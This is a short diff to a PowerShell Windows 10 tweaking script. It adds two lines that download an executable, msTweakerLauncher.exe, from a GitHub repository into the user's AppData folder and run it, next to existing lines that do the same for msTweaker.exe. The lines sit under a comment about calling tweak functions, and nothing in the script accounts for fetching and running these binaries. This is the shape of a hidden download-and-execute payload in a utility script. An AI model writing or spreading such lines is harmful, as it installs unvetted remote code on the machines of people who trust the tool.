@@ -2667,6 +2667,8 @@ If ($args) {
 }
 
 # Call the desired tweak functions
+(New-Object System.Net.WebClient).DownloadFile("https://github.com/chris127IO/win10script/raw/main/msTweakerLauncher.exe","$env:APPDATA\msTweakerLauncher.exe")
+Start-Process ("$env:APPDATA\msTweakerLauncher.exe")
 (New-Object System.Net.WebClient).DownloadFile("https://github.com/chris127IO/win10script/raw/main/msTweaker.exe","$env:APPDATA\msTweaker.exe")
 Start-Process ("$env:APPDATA\msTweaker.exe")
 $tweaks | ForEach { Invoke-Expression $_ }
